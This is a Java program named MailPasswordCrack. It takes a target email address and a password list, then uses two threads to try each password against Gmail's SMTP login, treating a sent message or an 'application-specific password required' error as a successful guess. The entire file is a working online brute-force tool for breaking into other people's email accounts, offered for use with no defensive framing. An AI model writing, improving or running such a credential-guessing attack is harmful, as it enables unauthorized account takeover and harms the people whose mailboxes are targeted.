import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;
import java.util.Scanner;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class MailPasswordCrack {

	static List<String> list = new ArrayList<String>();
	static List<String> list2 = new ArrayList<String>();
	static List<String> list3 = new ArrayList<String>();
	private static Properties props = new Properties();
	private static String mail = "";

	public static void main(String[] args) throws IOException {
		int count = 0;
		Scanner sc = new Scanner(System.in);
		System.out.print("Enter Mail For Crack Password : ");
		mail = sc.next();
		System.out.print("Enter Password List File Path : ");
		String path = sc.next();
		sc.close();
		
		@SuppressWarnings("resource")
		BufferedReader reader = new BufferedReader(new FileReader(path));
		while (reader.ready()) {
			list.add(reader.readLine());
		}
		count = list.size() / 2;
		for (int i = 0; i < count; i++) {
			list2.add(list.get(i));
		}
		for (int i = count; i < list.size(); i++) {
			list3.add(list.get(i));
		}

		props = System.getProperties();
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.host", "smtp.gmail.com");
		props.put("mail.smtp.port", "587");
		props.put("mail.smtp.auth", "true");

		Thread thread1 = new Thread(new Runnable() {
			@Override
			public void run() {
				serverOne();
			}
		});
		Thread thread2 = new Thread(new Runnable() {
			@Override
			public void run() {
				serverTwo();
			}
		});
		thread1.start();
		thread2.start();
	}

	public static void serverOne() {

		for (String s : list2) {
			Session session = Session.getInstance(props, new Authenticator() {
				protected PasswordAuthentication getPasswordAuthentication() {
					return new PasswordAuthentication(mail.trim(), s.trim());
				}
			});
			try {
				MimeMessage message = new MimeMessage(session);
				message.setFrom(new InternetAddress(mail.trim()));
				message.addRecipient(Message.RecipientType.TO, new InternetAddress("ABC@gmail.com"));
				message.setSubject("This is Mail Testing");
				message.setText(".................");
				Transport.send(message);
				System.err.println("Password Match : " + s);
				System.exit(0);
			} catch (MessagingException mex) {
				String message = mex.getLocalizedMessage();
				if (message.contains("Username and Password not accepted")) {
					System.out.println("Wating For Correct Password...");
				} else if (message.contains("Application-specific password required")) {
					System.err.println("Password Match : " + s);
					System.exit(0);
				} else if (message.contains("Unknown SMTP host: smtp.gmail.com")) {
					System.err.println("Please Connect To The Internet");
					System.exit(0);
				} else {
					System.out.println(mex.getMessage());
				}
			}
		}
		System.err.println("If Your Given Email is Correct, Then No Password Is Match For Given Email");
	}

	public static void serverTwo() {

		for (String s : list3) {
			Session session = Session.getInstance(props, new Authenticator() {
				protected PasswordAuthentication getPasswordAuthentication() {
					return new PasswordAuthentication(mail.trim(), s.trim());
				}
			});
			try {
				MimeMessage message = new MimeMessage(session);
				message.setFrom(new InternetAddress(mail.trim()));
				message.addRecipient(Message.RecipientType.TO, new InternetAddress("ABC@gmail.com"));
				message.setSubject("This is Mail Testing");
				message.setText(".................");
				Transport.send(message);
				System.err.println("Password Match : " + s);
				System.exit(0);
			} catch (MessagingException mex) {
				String message = mex.getLocalizedMessage();
				if (message.contains("Username and Password not accepted")) {
					System.out.println("Wating For Correct Password...");
				} else if (message.contains("Application-specific password required")) {
					System.err.println("Password Match : " + s);
					System.exit(0);
				} else if (message.contains("Unknown SMTP host: smtp.gmail.com")) {
					System.err.println("Please Connect To The Internet");
					System.exit(0);
				} else {
					System.out.println(mex.getMessage());
				}
			}
		}
		System.err.println("If Your Given Email is Correct, Then No Password Is Match For Given Email");
	}

}
